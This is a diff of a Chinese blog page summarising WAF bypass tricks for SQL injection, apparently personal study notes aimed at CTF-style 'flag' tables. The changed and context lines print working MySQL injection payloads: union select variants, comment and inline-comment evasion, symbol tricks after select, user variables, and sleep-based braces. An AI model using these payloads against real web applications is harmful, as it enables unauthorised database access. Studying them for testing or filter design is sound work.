@@ -100,7 +100,7 @@
 <meta property="og:url" content="https://sn0wdown.github.io/2017/09/19/2017-09-19-wafbypass总结/index.html">
 <meta property="og:site_name" content="sn0wdown&#39;s blog">
 <meta property="og:description" content="关于waf bypass的一些汇总和总结，大部分资源来自网络，仅供自己学习总结">
-<meta property="og:updated_time" content="2017-09-19T08:55:52.841Z">
+<meta property="og:updated_time" content="2017-09-19T09:05:09.937Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="wafbypass总结">
 <meta name="twitter:description" content="关于waf bypass的一些汇总和总结，大部分资源来自网络，仅供自己学习总结">
@@ -528,16 +528,19 @@ id=8e0union select user()
 <pre><code>id=1 union distinctrow select flag from flag.flag#  
 id=1 union distinct select flag from flag.flag#  
 id=1 union all select flag from flag.flag#
-</code></pre><p>过滤了union select，可能会使用如下正则写法过滤：/union\s+select/i （即检测union和select之间的空格）<br>1）使用括号绕过检测()，括号可灵活使用，表名、字段均可使用<br>2）使用<figure class="highlight plain"><figcaption><span>```  </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">3）利用注释符，```union/*xxxxxxxxxx*/select</div></pre></td></tr></table></figure></p>
-<h3 id="select-连接字段姿势"><a href="#select-连接字段姿势" class="headerlink" title="select 连接字段姿势"></a>select 连接字段姿势</h3><p>select.``.    </p>
-<pre><code>id=xxoo&apos; union select.``.flag from flag.flag#    
+</code></pre><p>过滤了union select，可能会使用如下正则写法过滤：/union\s+select/i （即检测union和select之间的空格）  </p>
+<pre><code>1）使用括号绕过检测()，括号可灵活使用，表名、字段均可使用  
+2）使用/*!select*/  
+3）利用注释符，union/*xxxxxxxxxx*/select
+</code></pre><h3 id="select-连接字段姿势"><a href="#select-连接字段姿势" class="headerlink" title="select 连接字段姿势"></a>select 连接字段姿势</h3><pre><code>select.``.    
+id=xxoo&apos; union select.``.flag from flag.flag#    
 
 select 后面接 - ~ + ! ”” 或者 @   
 id=2312 union select~1,user()   
 id=2312 union select &quot;1&quot;,user()
 </code></pre><p>@自定义变量  </p>
 <pre><code>Id=bs&apos;union distinctrow select(make_set(@i:=-1,&apos;a&apos;,user(),&apos;a&apos;,database(),@i,(select flag from flag.flag)))--+  
-</code></pre><p>自定义变量绕过union+select+from案例 </p>
+</code></pre><p>自定义变量绕过union+select+from案例    </p>
 <pre><code>select name from mysql_bypass where id =1 | @xx:=(select user()) union select @xx;
 </code></pre><h3 id="MySQL特殊用法：任意插入-随机字符-0b-目标值"><a href="#MySQL特殊用法：任意插入-随机字符-0b-目标值" class="headerlink" title="MySQL特殊用法：任意插入{[随机字符]%0b[目标值]}"></a>MySQL特殊用法：任意插入{[随机字符]%0b[目标值]}</h3><pre><code>id=2312 union select {x @},user()  
 id={xsad 12321} and {x sleep(1)}   
